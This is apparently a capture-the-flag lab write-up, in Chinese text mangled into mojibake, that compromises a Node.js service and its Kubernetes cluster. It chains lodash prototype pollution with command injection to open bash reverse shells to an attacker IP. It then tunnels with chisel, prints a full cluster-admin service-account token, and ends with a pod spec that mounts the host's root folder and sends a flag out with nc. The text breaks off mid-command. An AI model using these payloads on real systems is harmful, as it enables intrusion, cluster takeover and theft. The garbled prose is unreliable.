â”Œâ”€â”€(rootğŸ’€root)-[~/Desktop] â””â”€# ./read.sh â”Œâ”€â”€(rootğŸ’€root)-[~/Desktop] â””â”€# cat message.json { &quot;auth&quot;: { &quot;name&quot;:&quot;felamos&quot;, &quot;password&quot;:&quot;Winter2021&quot; }, &quot;filename&quot;:&quot;&quot; } å’±ä»¬ä½¿ç”¨burpæ•æ‰ä¸€ä¸‹æµé‡è¯•è¯• æˆåŠŸè®©æˆ‘ä»¬æŸ¥çœ‹ä¸€ä¸‹ index.js çš„å†…å®¹ {&quot;ok&quot;:true,&quot;content&quot;:&quot;var root = require(\\&quot;google-cloudstorage-commands\\&quot;);\\nconst express = require(&#39;express&#39;);\\nconst { exec } = require(\\&quot;child_process\\&quot;); \\nconst bodyParser = require(&#39;body-parser&#39;); \\nconst _ = require(&#39;lodash&#39;); \\nconst app = express();\\nvar fs = require(&#39;fs&#39;);\\n \\nconst users = [ \\n {name: &#39;felamos&#39;, password: &#39;Winter2021&#39;},\\n {name: &#39;admin&#39;, password: Math.random().toString(32), canDelete: true, canUpload: true}, \\n];\\n\\nlet messages = []; \\nlet lastId = 1; \\n \\nfunction findUser(auth) { \\n return users.find((u) =&gt; \\n u.name === auth.name &amp;&amp; \\n u.password === auth.password); \\n} \\n \\napp.use(bodyParser.json()); \\n \\napp.get(&#39;/&#39;, (req, res) =&gt; { \\n res.send(messages); \\n}); \\n \\napp.put(&#39;/&#39;, (req, res) =&gt; { \\n const user = findUser(req.body.auth || {}); \\n \\n if (!user) { \\n res.status(403).send({ok: false, error: &#39;Access denied&#39;}); \\n return;\\n }\\n\\n const message = {\\n icon: &#39;__&#39;,\\n };\\n\\n _.merge(message, req.body.message, {\\n id: lastId++,\\n timestamp: Date.now(),\\n userName: user.name,\\n });\\n\\n messages.push(message);\\n res.send({ok: true});\\n});\\n\\napp.delete(&#39;/&#39;, (req, res) =&gt; {\\n const user = findUser(req.body.auth || {});\\n\\n if (!user || !user.canDelete) {\\n res.status(403).send({ok: false, error: &#39;Access denied&#39;});\\n return;\\n }\\n\\n messages = messages.filter((m) =&gt; m.id !== req.body.messageId);\\n res.send({ok: true});\\n});\\napp.post(&#39;/upload&#39;, (req, res) =&gt; {\\n const user = findUser(req.body.auth || {});\\n if (!user || !user.canUpload) {\\n res.status(403).send({ok: false, error: &#39;Access denied&#39;});\\n return;\\n }\\n\\n\\n filename = req.body.filename;\\n root.upload(\\&quot;./\\&quot;,filename, true);\\n res.send({ok: true, Uploaded_File: filename});\\n});\\n\\napp.post(&#39;/todo&#39;, (req, res) =&gt; {\\n\\tconst user = findUser(req.body.auth || {});\\n\\tif (!user) {\\n\\t\\tres.status(403).send({ok: false, error: &#39;Access denied&#39;});\\n\\t\\treturn;\\n\\t}\\n\\n\\tfilename = req.body.filename;\\n testFolder = \\&quot;/usr/src/app\\&quot;;\\n fs.readdirSync(testFolder).forEach(file =&gt; {\\n if (file.indexOf(filename) &gt; -1) {\\n var buffer = fs.readFileSync(filename).toString();\\n res.send({ok: true, content: buffer});\\n }\\n });\\n});\\n\\napp.listen(3000);\\nconsole.log(&#39;Listening on port 3000...&#39;);\\n&quot;} è¿™ä¸ªæ ¼å¼æ˜¯çœŸçš„ç³Ÿç³•ï¼Œä¸ºäº†æ–¹ä¾¿é˜…è¯»ï¼Œæˆ‘ä»¬ç»™å®ƒç¾åŒ–ä¸€ä¸‹ var root = require(&quot;google-cloudstorage-commands&quot;); const express = require(&#39;express&#39;); const { exec } = require(&quot;child_process&quot;); const bodyParser = require(&#39;body-parser&#39;); const _ = require(&#39;lodash&#39;); const app = express(); var fs = require(&#39;fs&#39;); const users = [ {name: &#39;felamos&#39;, password: &#39;Winter2021&#39;}, {name: &#39;admin&#39;, password: Math.random().toString(32), canDelete: true, canUpload: true}, ]; let messages = []; let lastId = 1; function findUser(auth) { return users.find((u) =&gt; u.name === auth.name &amp;&amp; u.password === auth.password); } app.use(bodyParser.json()); app.get(&#39;/&#39;, (req, res) =&gt; { res.send(messages); }); app.put(&#39;/&#39;, (req, res) =&gt; { const user = findUser(req.body.auth || {}); if (!user) { res.status(403).send({ok: false, error: &#39;Access denied&#39;}); return; } const message = { icon: &#39;__&#39;, }; _.merge(message, req.body.message, { id: lastId++, timestamp: Date.now(), userName: user.name, }); messages.push(message); res.send({ok: true}); }); app.delete(&#39;/&#39;, (req, res) =&gt; { const user = findUser(req.body.auth || {}); if (!user || !user.canDelete) { res.status(403).send({ok: false, error: &#39;Access denied&#39;}); return; } messages = messages.filter((m) =&gt; m.id !== req.body.messageId); res.send({ok: true}); }); app.post(&#39;/upload&#39;, (req, res) =&gt; { const user = findUser(req.body.auth || {}); if (!user || !user.canUpload) { res.status(403).send({ok: false, error: &#39;Access denied&#39;}); return; } filename = req.body.filename; root.upload(&quot;./&quot;,filename, true); res.send({ok: true, Uploaded_File: filename}); }); app.post(&#39;/todo&#39;, (req, res) =&gt; { const user = findUser(req.body.auth || {}); if (!user) { res.status(403).send({ok: false, error: &#39;Access denied&#39;}); return; } filename = req.body.filename; testFolder = &quot;/usr/src/app&quot;; fs.readdirSync(testFolder).forEach(file =&gt; { if (file.indexOf(filename) &gt; -1) { var buffer = fs.readFileSync(filename).toString(); res.send({ok: true, content: buffer}); } }); }); app.listen(3000); console.log(&#39;Listening on port 3000...&#39;); æˆ‘ä»¬è¯»å–æ–‡ä»¶package.jsonï¼Œå¾—åˆ°äº† {&quot;ok&quot;:true,&quot;content&quot;:&quot;{\\n \\&quot;name\\&quot;: \\&quot;Unobtainium-Server\\&quot;,\\n \\&quot;version\\&quot;: \\&quot;1.0.0\\&quot;,\\n \\&quot;description\\&quot;: \\&quot;API Service for Electron client\\&quot;,\\n \\&quot;main\\&quot;: \\&quot;index.js\\&quot;,\\n \\&quot;scripts\\&quot;: {\\n \\&quot;start\\&quot;: \\&quot;node index.js\\&quot;\\n },\\n \\&quot;author\\&quot;: \\&quot;felamos\\&quot;,\\n \\&quot;license\\&quot;: \\&quot;ISC\\&quot;,\\n \\&quot;dependencies\\&quot;: {\\n \\&quot;body-parser\\&quot;: \\&quot;1.18.3\\&quot;,\\n \\&quot;express\\&quot;: \\&quot;4.16.4\\&quot;,\\n \\&quot;lodash\\&quot;: \\&quot;4.17.4\\&quot;,\\n \\&quot;google-cloudstorage-commands\\&quot;: \\&quot;0.0.1\\&quot;\\n },\\n \\&quot;devDependencies\\&quot;: {}\\n}\\n&quot;} æˆ‘ä»¬ç¾åŒ–ä¸€ä¸‹ { &quot;name&quot;: &quot;Unobtainium-Server&quot;, &quot;version&quot;: &quot;1.0.0&quot;, &quot;description&quot;: &quot;API Service for Electron client&quot;, &quot;main&quot;: &quot;index.js&quot;, &quot;scripts&quot;: { &quot;start&quot;: &quot;node index.js&quot; }, &quot;author&quot;: &quot;felamos&quot;, &quot;license&quot;: &quot;ISC&quot;, &quot;dependencies&quot;: { &quot;body-parser&quot;: &quot;1.18.3&quot;, &quot;express&quot;: &quot;4.16.4&quot;, &quot;lodash&quot;: &quot;4.17.4&quot;, &quot;google-cloudstorage-commands&quot;: &quot;0.0.1&quot; }, &quot;devDependencies&quot;: {} } Lodashhttps://snyk.io/vuln/SNYK-JS-LODASH-73638 google-cloudstorage-commandshttps://snyk.io/vuln/SNYK-JS-GOOGLECLOUDSTORAGECOMMANDS-1050431 ä»ä¸Šé¢çš„å¸®åŠ©æ–‡æ¡£ï¼Œæˆ‘å‘ç°å¯ä»¥å‘½ä»¤æ³¨å…¥ #!/bin/bash RHOST=&quot;unobtainium.htb&quot; RPORT=31337 UA=&quot;Mozilla/5.0 (Windows NT 10.0; rv:78.0) Gecko/20100101 Firefox/78.0&quot; PROXY=&quot;127.0.0.1:8080&quot; TEXT=&quot;$1&quot; cat - &lt;&lt;EOF &gt; message.json { &quot;auth&quot;: { &quot;name&quot;:&quot;felamos&quot;, &quot;password&quot;:&quot;Winter2021&quot; }, &quot;message&quot;: { &quot;text&quot;:${TEXT} } } EOF curl -s \\ -X PUT \\ -A &quot;${UA}&quot; \\ -H &quot;Content-Type: application/json&quot; \\ -d &quot;$(cat message.json | jq -c)&quot; \\ -x &quot;${PROXY}&quot; \\ &quot;http://${RHOST}:${RPORT}/&quot; \\ | jq . (rootğŸ’€root)-[~/Desktop] â””â”€# ./exploit.sh &#39;{&quot;constructor&quot;:{&quot;prototype&quot;:{&quot;canDelete&quot;:true, &quot;canUpload&quot;:true}}}&#39; { &quot;ok&quot;: true } æˆåŠŸ è¿™ä¸ªæˆåŠŸçš„å“åº”æ„å‘³ç€æˆ‘ä»¬çœŸçš„å¯ä»¥åˆ©ç”¨è¿™ä¸ªæ¼æ´ï¼Œè®©æˆ‘ä»¬è¿è¡Œè„šæœ¬2æ£€æŸ¥æ˜¯å¦å¯ä»¥å†™å…¥æ–‡ä»¶ #!/bin/bash RHOST=&quot;unobtainium.htb&quot; RPORT=31337 UA=&quot;Mozilla/5.0 (Windows NT 10.0; rv:78.0) Gecko/20100101 Firefox/78.0&quot; PROXY=&quot;127.0.0.1:8080&quot; FILE=&quot;&amp; echo lucifiel | tee lucifiel.txt&quot; cat - &lt;&lt;EOF &gt; message.json { &quot;auth&quot;: { &quot;name&quot;:&quot;felamos&quot;, &quot;password&quot;:&quot;Winter2021&quot; }, &quot;filename&quot;:&quot;${FILE}&quot; } EOF curl -s \\ -A &quot;${UA}&quot; \\ -H &quot;Content-Type: application/json&quot; \\ -d &quot;$(cat message.json | jq -c)&quot; \\ -x &quot;${PROXY}&quot; \\ -o /dev/null \\ &quot;http://${RHOST}:${RPORT}/upload&quot; â”Œâ”€â”€(rootğŸ’€root)-[~/Desktop] â””â”€# ./exploit2.sh è¿è¡ŒæˆåŠŸï¼Œè®©æˆ‘ä»¬è¯»å– lucifiel.txt è¯•è¯•æ˜¯å¦å†™å…¥æˆåŠŸ å†™å…¥æˆåŠŸï¼Œç°åœ¨æˆ‘ä»¬æ¥åˆ©ç”¨è¿™ä¸ªæ¼æ´getshell é¦–å…ˆä½¿ç”¨ncç›‘å¬ä¸€ä¸ªç«¯å£ nc -nvlp 4444 POST /upload HTTP/1.1 Host: unobtainium.htb:31337 User-Agent: Mozilla/5.0 (Windows NT 10.0; rv:78.0) Gecko/20100101 Firefox/78.0 Accept: */* Content-Type: application/json Content-Length: 151 Connection: close {&quot;auth&quot;:{&quot;name&quot;:&quot;felamos&quot;,&quot;password&quot;:&quot;Winter2021&quot;},&quot;filename&quot;:&quot;&amp; echo $(echo &#39;bash -i &gt;&amp; /dev/tcp/10.10.14.53/4444 0&gt;&amp;1&#39; | base64) | base64 -d | bash&quot;} æ‰§è¡Œåï¼ŒæˆåŠŸè·å¾—ä¸€ä¸ªshell â”Œâ”€â”€(rootğŸ’€root)-[~/Downloads] â””â”€# nc -nvlp 4444 listening on [any] 4444 ... connect to [10.10.14.53] from (UNKNOWN) [10.10.10.235] 58362 bash: cannot set terminal process group (1): Inappropriate ioctl for device bash: no job control in this shell root@webapp-deployment-5d764566f4-mbprj:/usr/src/app# whoami &amp;&amp; id whoami &amp;&amp; id root uid=0(root) gid=0(root) groups=0(root) root@webapp-deployment-5d764566f4-mbprj:/usr/src/app# root@webapp-deployment-5d764566f4-mbprj:~# cd /root cd /root root@webapp-deployment-5d764566f4-mbprj:~# ls ls user.txt root@webapp-deployment-5d764566f4-mbprj:~# cat user.txt cat user.txt 7ff2ddd449da8a15c66289e2ec015cd9 æˆåŠŸæ‹¿åˆ°useræƒé™çš„flag ## æƒé™æå‡ æˆ‘ä»¬å¯ä»¥çœ‹åˆ°ï¼Œè¿™é‡Œçš„rootæ˜¯åœ¨ä¸€ä¸ªdockerå®¹å™¨é‡Œ å› ä¸ºæ²¡å•¥æ€è·¯ï¼Œè®©æˆ‘ä»¬å…ˆè·‘ä¸€ä¸‹linpeaså§ https://github.com/LucifielHack/privilege-escalation-awesome-scripts-suite/blob/master/linPEAS/linpeas.sh ä½¿ç”¨python3åœ¨æœ¬åœ°å¼€å¯ä¸€ä¸ªhttpæœåŠ¡ python3 -m http.server ç„¶ååœ¨shellä¸­ä½¿ç”¨wgetè¿›è¡Œä¸‹è½½ wget http://10.10.14.53:8000/linpeas.sh ç„¶åæ·»åŠ æƒé™åè¿è¡Œ chmod +x linpeas.sh ./linpeas.sh åœ¨ç»“æœä¸­çœ‹åˆ°äº†ä¸€å¥ * * * * * find / -name kubectl -exec rm {} \\; * * * * * find / -name kubectl -exec rm {} \\; æœ‰ä¸€ä¸ªcronjobæ­£åœ¨è¿è¡Œï¼Œæ¯åˆ†é’Ÿåˆ é™¤å®¹å™¨ä¸­çš„kubectl ä½†æ˜¯å®¹å™¨ä¸­æ²¡æœ‰kubectlå¯æ‰§è¡Œæ–‡ä»¶ è®©æˆ‘ä»¬ä¸‹è½½ä¸€ä¸ªkubectlå¯æ‰§è¡Œæ–‡ä»¶å¹¶å°†å…¶ä¼ è¾“åˆ°/tmpæ–‡ä»¶å¤¹å†…çš„dockerä¸­ https://kubernetes.io/docs/tasks/tools/install-kubectl-linux/#install-kubectl-binary-with-curl-on-linux åœ¨Linuxä¸Šä½¿ç”¨curlå®‰è£…kubectläºŒè¿›åˆ¶æ–‡ä»¶ curl -LO &quot;https://dl.k8s.io/release/$(curl -L -s https://dl.k8s.io/release/stable.txt)/bin/linux/amd64/kubectl&quot; python3 -m http.server 80 ç„¶ååœ¨shellä¸­ä½¿ç”¨wgetè¿›è¡Œä¸‹è½½ wget http://10.10.14.53/kubectl -o /tmp/kubectl-lucifiel cd /tmp/ chmod +x kubectl-lucifiel æ›´æ”¹ä¸€ä¸ªåå­—é¿å…è¢«cronjobç»™åˆ æ‰ é¦–å…ˆè®©æˆ‘ä»¬æ£€æŸ¥ä¸€ä¸‹kubectl ./kubectl-lucifiel get namespace ./kubectl-lucifiel get pods -n dev ./kubectl-lucifiel describe pod devnode-deployment-cd86fb5c-6ms8d -n dev root@webapp-deployment-5d764566f4-h5zhw:/tmp# ./kubectl-lucifiel get namespace &lt;4566f4-h5zhw:/tmp# ./kubectl-lucifiel get namespace NAME STATUS AGE default Active 180d dev Active 179d kube-node-lease Active 180d kube-public Active 180d kube-system Active 180d root@webapp-deployment-5d764566f4-h5zhw:/tmp# ./kubectl-lucifiel get pods -n dev &lt;66f4-h5zhw:/tmp# ./kubectl-lucifiel get pods -n dev NAME READY STATUS RESTARTS AGE devnode-deployment-cd86fb5c-6ms8d 1/1 Running 28 179d devnode-deployment-cd86fb5c-mvrfz 1/1 Running 29 179d devnode-deployment-cd86fb5c-qlxww 1/1 Running 29 179d root@webapp-deployment-5d764566f4-h5zhw:/tmp# ./kubectl-lucifiel describe pod devnode-deployment-cd86fb5c-6ms8d -n dev &lt;scribe pod devnode-deployment-cd86fb5c-6ms8d -n dev Name: devnode-deployment-cd86fb5c-6ms8d Namespace: dev Priority: 0 Node: unobtainium/10.10.10.235 Start Time: Sun, 17 Jan 2021 18:16:21 +0000 Labels: app=devnode pod-template-hash=cd86fb5c Annotations: &lt;none&gt; Status: Running IP: 172.17.0.8 IPs: IP: 172.17.0.8 Controlled By: ReplicaSet/devnode-deployment-cd86fb5c Containers: devnode: Container ID: docker://c22604a2e5d200e2d08b41724e76633954e82ba9d5f4ab201207860f9dc9b91f Image: localhost:5000/node_server Image ID: docker-pullable://localhost:5000/node_server@sha256:f3bfd2fc13c7377a380e018279c6e9b647082ca590600672ff787e1bb918e37c Port: 3000/TCP Host Port: 0/TCP State: Running Started: Fri, 16 Jul 2021 05:11:42 +0000 Last State: Terminated Reason: Error Exit Code: 137 Started: Wed, 24 Mar 2021 16:01:28 +0000 Finished: Wed, 24 Mar 2021 16:02:13 +0000 Ready: True Restart Count: 28 Environment: &lt;none&gt; Mounts: /var/run/secrets/kubernetes.io/serviceaccount from default-token-rmcd6 (ro) Conditions: Type Status Initialized True Ready True ContainersReady True PodScheduled True Volumes: default-token-rmcd6: Type: Secret (a volume populated by a Secret) SecretName: default-token-rmcd6 Optional: false QoS Class: BestEffort Node-Selectors: &lt;none&gt; Tolerations: node.kubernetes.io/not-ready:NoExecute op=Exists for 300s node.kubernetes.io/unreachable:NoExecute op=Exists for 300s Events: &lt;none&gt; åˆ©ç”¨æ–¹æ³•å’Œå‰é¢ä¸€æ ·ï¼Œç¨å¾®ä¿®æ”¹ä¸€ä¸‹è„šæœ¬ #!/bin/bash RHOST=&quot;127.0.0.1&quot; RPORT=3000 UA=&quot;Mozilla/5.0 (Windows NT 10.0; rv:78.0) Gecko/20100101 Firefox/78.0&quot; PROXY=&quot;127.0.0.1:8080&quot; TEXT=&quot;$1&quot; cat - &lt;&lt;EOF &gt; message.json { &quot;auth&quot;: { &quot;name&quot;:&quot;felamos&quot;, &quot;password&quot;:&quot;Winter2021&quot; }, &quot;message&quot;: { &quot;text&quot;:${TEXT} } } EOF curl -s \\ -X PUT \\ -A &quot;${UA}&quot; \\ -H &quot;Content-Type: application/json&quot; \\ -d &quot;$(cat message.json | jq -c)&quot; \\ -x &quot;${PROXY}&quot; \\ &quot;http://${RHOST}:${RPORT}/&quot; \\ | jq . #!/bin/bash RHOST=&quot;127.0.0.1&quot; RPORT=3000 UA=&quot;Mozilla/5.0 (Windows NT 10.0; rv:78.0) Gecko/20100101 Firefox/78.0&quot; PROXY=&quot;127.0.0.1:8080&quot; FILE=$1 cat - &lt;&lt;EOF &gt; message.json { &quot;auth&quot;: { &quot;name&quot;:&quot;felamos&quot;, &quot;password&quot;:&quot;Winter2021&quot; }, &quot;filename&quot;:&quot;${FILE}&quot; } EOF curl -s \\ -A &quot;${UA}&quot; \\ -H &quot;Content-Type: application/json&quot; \\ -d &quot;$(cat message.json | jq -c)&quot; \\ -x &quot;${PROXY}&quot; \\ -o /dev/null \\ &quot;http://${RHOST}:${RPORT}/upload&quot; æˆ‘ä»¬éœ€è¦ä½¿ç”¨Chiselå°†ç«¯å£è½¬å‘åˆ°devnode-deploymentå®¹å™¨â€œ172.17.0.8:3000â€ å‚è€ƒè§†é¢‘ https://www.youtube.com/watch?v=Yp4oxoQIBAM&amp;t=1469s ä¸‹è½½åœ°å€ https://github.com/jpillora/chisel å¦‚æœé‡åˆ°connect: connection refusedï¼Œè§£å†³æ–¹æ¡ˆ https://blog.csdn.net/hhyukJae/article/details/106980818 å‘½ä»¤æ‰§è¡Œæ­¥éª¤ go chisel du -hs chisel go build -ldflags=&quot;-s -w&quot; upx brute chisel du -hs chisel ç„¶åä½¿ç”¨python3å¼€å¯ä¸€ä¸ªhttpæœåŠ¡ä»¥åï¼Œä½¿ç”¨wgetä¸‹è½½åˆ°é¶æœºé‡Œ ç»™chiselä¸€ä¸ª777æƒé™åï¼Œä½¿ç”¨chiselå¼€å¯ä¸€ä¸ªæœåŠ¡ æœ¬åœ°è¿è¡Œ chmod 777 chisel ./chisel server -p 9999 --reverse â”Œâ”€â”€(rootğŸ’€root)-[~/Desktop/chisel] â””â”€# ./chisel server -p 9999 --reverse 2021/07/17 02:45:18 server: Reverse tunnelling enabled 2021/07/17 02:45:18 server: Fingerprint kcPnWygZKzUCU+9rAzUk0r6I13LgnEuy/vKZsUNEgCQ= 2021/07/17 02:45:18 server: Listening on http://0.0.0.0:9999 é¶æœºè¿è¡Œ chmod 777 chisel ./chisel client 10.10.14.53:9999 R:3000:172.17.0.8:3000 root@webapp-deployment-5d764566f4-mbprj:/tmp# ./chisel client 10.10.14.53:9999 R:3000:172.17.0.8:3000 &lt;isel client 10.10.14.53:9999 R:3000:172.17.0.8:3000 2021/07/16 19:04:27 client: Connecting to ws://10.10.14.53:9999 2021/07/16 19:04:29 client: Connected (Latency 251.63886ms) ç„¶åç°åœ¨è®©æˆ‘ä»¬è¿è¡Œä¿®æ”¹åçš„exploit.sh â”Œâ”€â”€(rootğŸ’€root)-[~/Desktop] â””â”€# ./exploit.sh &#39;{&quot;constructor&quot;:{&quot;prototype&quot;:{&quot;canDelete&quot;:true, &quot;canUpload&quot;:true}}}&#39; 4 â¨¯ { &quot;ok&quot;: true } ç„¶åè¿è¡Œexploit2.sh ./exploit2.sh &quot;&amp; echo $(echo &#39;bash -i &gt;&amp; /dev/tcp/10.10.14.53/5555 0&gt;&amp;1&#39; | base64) | base64 -d | bash&quot; â”Œâ”€â”€(rootğŸ’€root)-[~/Desktop] â””â”€# nc -nvlp 5555 listening on [any] 5555 ... connect to [10.10.14.53] from (UNKNOWN) [10.10.10.235] 58012 bash: cannot set terminal process group (1): Inappropriate ioctl for device bash: no job control in this shell root@devnode-deployment-cd86fb5c-6ms8d:/usr/src/app# whoami &amp;&amp; id whoami &amp;&amp; id root uid=0(root) gid=0(root) groups=0(root) æˆåŠŸè·å¾—å¦ä¸€ä¸ªshell ç„¶åæˆ‘ä»¬åˆ°/tmp/ç›®å½•ä¸‹ç»§ç»­è¿è¡Œkubectlè„šæœ¬ cd /tmp ./kubectl-lucifiel get secrets -n kube-system root@devnode-deployment-cd86fb5c-6ms8d:/tmp# ./kubectl-lucifiel get secrets -n kube-system &lt;/tmp# ./kubectl-lucifiel get secrets -n kube-system NAME TYPE DATA AGE attachdetach-controller-token-5dkkr kubernetes.io/service-account-token 3 180d bootstrap-signer-token-xl4lg kubernetes.io/service-account-token 3 180d c-admin-token-tfmp2 kubernetes.io/service-account-token 3 180d certificate-controller-token-thnxw kubernetes.io/service-account-token 3 180d clusterrole-aggregation-controller-token-scx4p kubernetes.io/service-account-token 3 180d coredns-token-dbp92 kubernetes.io/service-account-token 3 180d cronjob-controller-token-chrl7 kubernetes.io/service-account-token 3 180d daemon-set-controller-token-cb825 kubernetes.io/service-account-token 3 180d default-token-l85f2 kubernetes.io/service-account-token 3 180d deployment-controller-token-cwgst kubernetes.io/service-account-token 3 180d disruption-controller-token-kpx2x kubernetes.io/service-account-token 3 180d endpoint-controller-token-2jzkv kubernetes.io/service-account-token 3 180d endpointslice-controller-token-w4hwg kubernetes.io/service-account-token 3 180d endpointslicemirroring-controller-token-9qvzz kubernetes.io/service-account-token 3 180d expand-controller-token-sc9fw kubernetes.io/service-account-token 3 180d generic-garbage-collector-token-2hng4 kubernetes.io/service-account-token 3 180d horizontal-pod-autoscaler-token-6zhfs kubernetes.io/service-account-token 3 180d job-controller-token-h6kg8 kubernetes.io/service-account-token 3 180d kube-proxy-token-jc8kn kubernetes.io/service-account-token 3 180d namespace-controller-token-2klzl kubernetes.io/service-account-token 3 180d node-controller-token-k6p6v kubernetes.io/service-account-token 3 180d persistent-volume-binder-token-fd292 kubernetes.io/service-account-token 3 180d pod-garbage-collector-token-bjmrd kubernetes.io/service-account-token 3 180d pv-protection-controller-token-9669w kubernetes.io/service-account-token 3 180d pvc-protection-controller-token-w8m9r kubernetes.io/service-account-token 3 180d replicaset-controller-token-bzbt8 kubernetes.io/service-account-token 3 180d replication-controller-token-jz8k8 kubernetes.io/service-account-token 3 180d resourcequota-controller-token-wg7rr kubernetes.io/service-account-token 3 180d root-ca-cert-publisher-token-cnl86 kubernetes.io/service-account-token 3 180d service-account-controller-token-44bfm kubernetes.io/service-account-token 3 180d service-controller-token-pzjnq kubernetes.io/service-account-token 3 180d statefulset-controller-token-z2nsd kubernetes.io/service-account-token 3 180d storage-provisioner-token-tk5k5 kubernetes.io/service-account-token 3 180d token-cleaner-token-wjvf9 kubernetes.io/service-account-token 3 180d ttl-controller-token-z87px kubernetes.io/service-account-token 3 180d æ¥ç€è®©æˆ‘ä»¬è·å–ä»¤ç‰Œ ./kubectl-lucifiel describe secrets/c-admin-token-tfmp2 -n kube-system root@devnode-deployment-cd86fb5c-6ms8d:/tmp# ./kubectl-lucifiel describe secrets/c-admin-token-tfmp2 -n kube-system &lt;describe secrets/c-admin-token-tfmp2 -n kube-system Name: c-admin-token-tfmp2 Namespace: kube-system Labels: &lt;none&gt; Annotations: kubernetes.io/service-account.name: c-admin kubernetes.io/service-account.uid: 2463505f-983e-45bd-91f7-cd59bfe066d0 Type: kubernetes.io/service-account-token Data ==== token: eyJhbGciOiJSUzI1NiIsImtpZCI6IkpOdm9iX1ZETEJ2QlZFaVpCeHB6TjBvaWNEalltaE1ULXdCNWYtb2JWUzgifQ.eyJpc3MiOiJrdWJlcm5ldGVzL3NlcnZpY2VhY2NvdW50Iiwia3ViZXJuZXRlcy5pby9zZXJ2aWNlYWNjb3VudC9uYW1lc3BhY2UiOiJrdWJlLXN5c3RlbSIsImt1YmVybmV0ZXMuaW8vc2VydmljZWFjY291bnQvc2VjcmV0Lm5hbWUiOiJjLWFkbWluLXRva2VuLXRmbXAyIiwia3ViZXJuZXRlcy5pby9zZXJ2aWNlYWNjb3VudC9zZXJ2aWNlLWFjY291bnQubmFtZSI6ImMtYWRtaW4iLCJrdWJlcm5ldGVzLmlvL3NlcnZpY2VhY2NvdW50L3NlcnZpY2UtYWNjb3VudC51aWQiOiIyNDYzNTA1Zi05ODNlLTQ1YmQtOTFmNy1jZDU5YmZlMDY2ZDAiLCJzdWIiOiJzeXN0ZW06c2VydmljZWFjY291bnQ6a3ViZS1zeXN0ZW06Yy1hZG1pbiJ9.Xk96pdC8wnBuIOm4Cgud9Q7zpoUNHICg7QAZY9EVCeAUIzh6rvfZJeaHucMiq8cm93zKmwHT-jVbAQyNfaUuaXmuek5TBdY94kMD5A_owFh-0kRUjNFOSr3noQ8XF_xnWmdX98mKMF-QxOZKCJxkbnLLd_h-P2hWRkfY8xq6-eUP8MYrYF_gs7Xm264A22hrVZxTb2jZjUj7LTFRchb7bJ1LWXSIqOV2BmU9TKFQJYCZ743abeVB7YvNwPHXcOtLEoCs03hvEBtOse2POzN54pK8Lyq_XGFJN0yTJuuQQLtwroF3579DBbZUkd4JBQQYrpm6Wdm9tjbOyGL9KRsNow ca.crt: 1066 bytes namespace: 11 bytes è®©æˆ‘ä»¬åˆ—å‡ºtoken root@devnode-deployment-cd86fb5c-6ms8d:/tmp# /tmp/kubectl-lucifiel --token=eyJhbGciOiJSUzI1NiIsImtpZCI6IkpOdm9iX1ZETEJ2QlZFaVpCeHB6TjBvaWNEalltaE1ULXdCNWYtb2JWUzgifQ.eyJpc3MiOiJrdWJlcm5ldGVzL3NlcnZpY2VhY2NvdW50Iiwia3ViZXJuZXRlcy5pby9zZXJ2aWNlYWNjb3VudC9uYW1lc3BhY2UiOiJrdWJlLXN5c3RlbSIsImt1YmVybmV0ZXMuaW8vc2VydmljZWFjY291bnQvc2VjcmV0Lm5hbWUiOiJjLWFkbWluLXRva2VuLXRmbXAyIiwia3ViZXJuZXRlcy5pby9zZXJ2aWNlYWNjb3VudC9zZXJ2aWNlLWFjY291bnQubmFtZSI6ImMtYWRtaW4iLCJrdWJlcm5ldGVzLmlvL3NlcnZpY2VhY2NvdW50L3NlcnZpY2UtYWNjb3VudC51aWQiOiIyNDYzNTA1Zi05ODNlLTQ1YmQtOTFmNy1jZDU5YmZlMDY2ZDAiLCJzdWIiOiJzeXN0ZW06c2VydmljZWFjY291bnQ6a3ViZS1zeXN0ZW06Yy1hZG1pbiJ9.Xk96pdC8wnBuIOm4Cgud9Q7zpoUNHICg7QAZY9EVCeAUIzh6rvfZJeaHucMiq8cm93zKmwHT-jVbAQyNfaUuaXmuek5TBdY94kMD5A_owFh-0kRUjNFOSr3noQ8XF_xnWmdX98mKMF-QxOZKCJxkbnLLd_h-P2hWRkfY8xq6-eUP8MYrYF_gs7Xm264A22hrVZxTb2jZjUj7LTFRchb7bJ1LWXSIqOV2BmU9TKFQJYCZ743abeVB7YvNwPHXcOtLEoCs03hvEBtOse2POzN54pK8Lyq_XGFJN0yTJuuQQLtwroF3579DBbZUkd4JBQQYrpm6Wdm9tjbOyGL9KRsNow cluster-info &lt;579DBbZUkd4JBQQYrpm6Wdm9tjbOyGL9KRsNow cluster-info Kubernetes control plane is running at https://10.96.0.1:443 KubeDNS is running at https://10.96.0.1:443/api/v1/namespaces/kube-system/services/kube-dns:dns/proxy To further debug and diagnose cluster problems, use &#39;kubectl cluster-info dump&#39;. åœ¨æœ¬åœ°åˆ›å»ºä¸€ä¸ªlucifiel.yamlè„šæœ¬ apiVersion: v1 kind: Pod metadata: name: some-pod namespace: default spec: containers: - name: web image: localhost:5000/dev-alpine command: [&quot;/bin/sh&quot;] args: [&quot;-c&quot;, &#39;cat /root/root.txt | nc -nv 10.10.14.53 6666; sleep 100000&#39;] volumeMounts: - mountPath: /root/ name: root-flag volumes: - hostPath: path: /root/ type: &quot;&quot; name: root-flag ç„¶åæœ¬åœ°ç›‘å¬ä¸€ä¸ªç«¯å£ï¼Œå¹¶ä¿å­˜æ–‡ä»¶ä¸ºroot.txt nc -nvlp 6666 &gt; root.txt ç„¶åè¿è¡Œè¯¥è„šæœ¬ /tmp/kubectl-lucifiel create -f /tmp/lucifiel.yaml --token 